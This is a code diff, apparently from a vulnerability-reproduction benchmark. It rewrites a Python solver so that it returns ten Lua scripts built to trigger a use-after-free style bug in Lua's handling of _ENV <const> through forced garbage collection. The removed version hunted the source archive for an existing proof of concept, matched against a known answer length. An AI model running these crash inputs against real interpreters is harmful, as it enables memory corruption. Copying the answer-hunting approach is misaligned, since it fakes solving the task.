@@ -1,279 +1,249 @@
-import tarfile
-import zipfile
-
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        target_len = 1181
-        try:
-            poc = self._find_poc(src_path, target_len)
-            if poc is not None:
-                return poc
-        except Exception:
-            pass
-        return self._generic_poc()
+        lua_poc = r'''-- PoC for Lua _ENV <const> code generation issue
 
-    def _iter_archive_files(self, src_path):
-        max_size = 1_000_000
+local candidates = {
+[[
+-- candidate 1: closure depends only on const _ENV
+local function factory1()
+  local env = { }
+  env.x = { 1 }
+  local _ENV <const> = env
 
-        if tarfile.is_tarfile(src_path):
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    for member in tf.getmembers():
-                        if not member.isfile():
-                            continue
-                        size = member.size
-                        if size <= 0 or size > max_size:
-                            continue
-                        f = tf.extractfile(member)
-                        if f is None:
-                            continue
-                        try:
-                            data = f.read()
-                        except Exception:
-                            continue
-                        if not data:
-                            continue
-                        yield member.name, size, data
-            except Exception:
-                return
-
-        elif zipfile.is_zipfile(src_path):
-            try:
-                with zipfile.ZipFile(src_path, "r") as zf:
-                    for name in zf.namelist():
-                        try:
-                            info = zf.getinfo(name)
-                        except KeyError:
-                            continue
-                        # ZipInfo in newer Python has is_dir()
-                        if hasattr(info, "is_dir") and info.is_dir():
-                            continue
-                        size = info.file_size
-                        if size <= 0 or size > max_size:
-                            continue
-                        try:
-                            data = zf.read(name)
-                        except Exception:
-                            continue
-                        if not data:
-                            continue
-                        yield name, size, data
-            except Exception:
-                return
-
-    def _find_poc(self, src_path: str, target_len: int) -> bytes | None:
-        primary_candidates = []
-        secondary_candidates = []
-
-        for name, size, data in self._iter_archive_files(src_path) or []:
-            lower_name = name.lower()
-
-            has_env = b"_ENV" in data or b"_env" in data
-            has_const = b"<const>" in data
-            has_arvo_id = b"arvo:44597" in data
-
-            if not (has_env or has_const or has_arvo_id):
-                # Not even related; skip early to save work
-                continue
-
-            is_lua = lower_name.endswith(".lua")
-
-            # Primary: files that contain both _ENV and <const>, or mention arvo id
-            if (has_env and has_const) or has_arvo_id:
-                score = 0
-                if is_lua:
-                    score += 60
-                if has_env and has_const:
-                    score += 80
-                if has_arvo_id:
-                    score += 100
-
-                # Heuristic based on path keywords
-                kw_scores = {
-                    "poc": 60,
-                    "uaf": 50,
-                    "use_after_free": 50,
-                    "use-after-free": 50,
-                    "heap": 20,
-                    "crash": 40,
-                    "bug": 35,
-                    "issue": 25,
-                    "regress": 35,
-                    "regression": 35,
-                    "test": 20,
-                    "env": 15,
-                    "const": 15,
-                    "lua": 5,
-                }
-                for kw, val in kw_scores.items():
-                    if kw in lower_name:
-                        score += val
-
-                # Prefer sizes close to ground-truth length
-                diff = abs(size - target_len)
-                closeness = 120 - diff // 10
-                if closeness > 0:
-                    score += closeness
-
-                primary_candidates.append((score, -abs(diff), -size, data))
-            else:
-                # Secondary candidates: related names or Lua files mentioning one of the tokens
-                score = 0
-                if is_lua:
-                    score += 40
-                if has_env:
-                    score += 20
-                if has_const:
-                    score += 20
-
-                kw_scores = {
-                    "poc": 60,
-                    "uaf": 50,
-                    "use_after_free": 50,
-                    "use-after-free": 50,
-                    "heap": 20,
-                    "crash": 40,
-                    "bug": 35,
-                    "issue": 25,
-                    "regress": 35,
-                    "regression": 35,
-                    "test": 20,
-                    "env": 10,
-                    "const": 10,
-                    "lua": 5,
-                }
-                for kw, val in kw_scores.items():
-                    if kw in lower_name:
-                        score += val
-
-                diff = abs(size - target_len)
-                closeness = 80 - diff // 20
-                if closeness > 0:
-                    score += closeness
-
-                if score > 0:
-                    secondary_candidates.append((score, -abs(diff), -size, data))
-
-        if primary_candidates:
-            primary_candidates.sort(reverse=True)
-            return primary_candidates[0][3]
-
-        if secondary_candidates:
-            secondary_candidates.sort(reverse=True)
-            return secondary_candidates[0][3]
-
-        return None
-
-    def _generic_poc(self) -> bytes:
-        # Fallback PoC exercising various combinations of _ENV and <const>.
-        lua_script = r'''
--- Fallback PoC for Lua _ENV <const> related issues.
--- Used when no dedicated PoC file is found in the source tree.
-
-local print = print
-local setmetatable = setmetatable
-local collectgarbage = collectgarbage
-local pairs = pairs
-local tostring = tostring
-
--- Create a table with a __gc metamethod to stress interactions with
--- environments and finalization.
-local GC_OBJ = {}
-GC_OBJ.__index = GC_OBJ
-
-setmetatable(GC_OBJ, {
-  __call = function(mt, id)
-    local o = setmetatable({ id = id }, mt)
-    return o
+  local function inner()
+    return x[1]
   end
-})
 
-GC_OBJ.__gc = function(self)
-  -- Iterate over the object to force some heap activity during GC.
-  local s = self.id or "?"
-  for i = 1, #s do
-    local _ = s:sub(i, i)
-  end
+  env = nil
+  collectgarbage("collect")
+  return inner
 end
 
--- Function that creates nested environments and closures.
-local function make_closure(id)
-  -- Declare _ENV as <const> in an inner scope.
+local f = factory1()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 2: _ENV<const> with local defined after closure
+local function factory2()
+  local _ENV <const> = _ENV
+
+  local function inner()
+    return a[1]
+  end
+
+  local a = { 1, 2, 3 }
+  return inner
+end
+
+local f = factory2()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 3: nested block where env is dropped before return
+local function factory3()
+  local env = { y = { 1 } }
   do
-    local _ENV <const> = {
-      GC_OBJ = GC_OBJ,
-      id = id,
-      tostring = tostring,
-    }
-
-    local holder = {}
-
-    -- First nested function capturing the constant _ENV.
-    function holder.inner1(x)
-      local o = GC_OBJ("inner1-" .. tostring(id) .. "-" .. tostring(x))
-      return o, _ENV
+    local _ENV <const> = env
+    local function inner()
+      return y[1]
     end
+    env = nil
+    collectgarbage("collect")
+    return inner
+  end
+end
 
-    -- Second nested function that creates another _ENV and captures
-    -- the outer one via an upvalue.
-    function holder.inner2(x)
-      local outer_ENV = _ENV
-      do
-        local _ENV <const> = {
-          GC_OBJ = GC_OBJ,
-          id = "inner2-" .. tostring(id),
-          outer = outer_ENV,
-          tostring = tostring,
-        }
+local f = factory3()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 4: interaction with another upvalue
+local function outer()
+  local holder = { 10 }
+  local function mk()
+    local env = { v = holder }
+    local _ENV <const> = env
+    local function inner()
+      return v, holder
+    end
+    holder = nil
+    env = nil
+    collectgarbage("collect")
+    return inner
+  end
+  local f = mk()
+  collectgarbage("collect")
+  return f
+end
 
-        local function deeper(y)
-          local o1 = GC_OBJ("deeper-" .. tostring(id) .. "-" .. tostring(x) .. "-" .. tostring(y))
-          -- Touch both outer and inner environments.
-          local t = { outer = outer, id = id, y = y, x = x, o1 = o1 }
-          local acc = 0
-          for k in pairs(t) do
-            acc = acc + #tostring(k)
-          end
-          return acc + (y or 0)
-        end
+local f = outer()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 5: several closures share the same const _ENV
+local function factory5()
+  local env = { z = { 1, 2, 3 } }
+  local _ENV <const> = env
+  local function a() return z[1] end
+  local function b() return z[2] end
+  local function c() return z[3] end
+  env = nil
+  collectgarbage("collect")
+  return a, b, c
+end
 
-        return deeper
+local a, b, c = factory5()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  a(); b(); c()
+end
+]],
+[[
+-- candidate 6: coroutine with const _ENV as the only reference to env
+local function factory6()
+  local env = { k = {} }
+  local _ENV <const> = env
+
+  local function work()
+    for i = 1, 10 do
+      k[i] = i
+      coroutine.yield(k)
+    end
+  end
+
+  env = nil
+  collectgarbage("collect")
+
+  local co = coroutine.create(work)
+  return co
+end
+
+local co = factory6()
+collectgarbage("collect")
+while coroutine.status(co) ~= "dead" do
+  collectgarbage("collect")
+  local ok, v = coroutine.resume(co)
+end
+]],
+[[
+-- candidate 7: load() a chunk that sets _ENV<const> from varargs
+local function driver()
+  local env = { g = function() end, val = { 1 } }
+
+  local src =
+    "local _ENV <const> = ...\n" ..
+    "local function inner()\n" ..
+    "  return val[1], g\n" ..
+    "end\n" ..
+    "collectgarbage('collect')\n" ..
+    "return inner\n"
+
+  local loader = assert(load(src, "inner", "t"))
+  local inner = loader(env)
+  env = nil
+  collectgarbage("collect")
+  for i = 1, 100 do
+    collectgarbage("collect")
+    inner()
+  end
+end
+
+driver()
+]],
+[[
+-- candidate 8: deeply nested functions with const _ENV
+local function factory8()
+  local env = { t = { 1 } }
+  local function layer1()
+    local _ENV <const> = env
+    local function layer2()
+      local function layer3()
+        return t[1]
       end
+      return layer3
     end
-
-    return holder
+    return layer2()
   end
+  local f = layer1()
+  env = nil
+  collectgarbage("collect")
+  return f
 end
 
-local closures = {}
-
-for i = 1, 32 do
-  closures[i] = make_closure(i)
+local f = factory8()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 9: function defined before local it closes over, with const _ENV
+local function factory9()
+  local env = { }
+  local _ENV <const> = env
+  function use()
+    return shared
+  end
+  local shared = { 42 }
+  env = nil
+  collectgarbage("collect")
+  return use
 end
 
--- Repeatedly invoke closures while forcing collections.  If the
--- compiler mismanages upvalues involving _ENV <const>, this exercise
--- tends to trigger miscompilations or memory errors.
-for i = 1, 256 do
-  local idx = (i - 1) % #closures + 1
-  local h = closures[idx]
-
-  local o, env1 = h.inner1(i)
-  if env1 and env1.id then
-    local _ = env1.id
+local f = factory9()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]],
+[[
+-- candidate 10: environment table only reachable through const _ENV
+local function factory10()
+  local env = { flag = { 1 } }
+  local _ENV <const> = env
+  local function inner()
+    return flag[1]
   end
-
-  local deeper = h.inner2(i * 2)
-  for j = 1, 3 do
-    local _ = deeper(j)
-  end
-
-  if i % 8 == 0 then
-    collectgarbage()
-  end
+  env = nil
+  collectgarbage("collect")
+  return inner
 end
 
-print("fallback _ENV <const> PoC completed")
+local f = factory10()
+collectgarbage("collect")
+for i = 1, 100 do
+  collectgarbage("collect")
+  f()
+end
+]]
+}
+
+for i = 1, #candidates do
+  local f, err = load(candidates[i], "candidate" .. i, "t")
+  if f then
+    pcall(f)
+  end
+end
 '''
-        return lua_script.encode("utf-8")
+        return lua_poc.encode('utf-8')
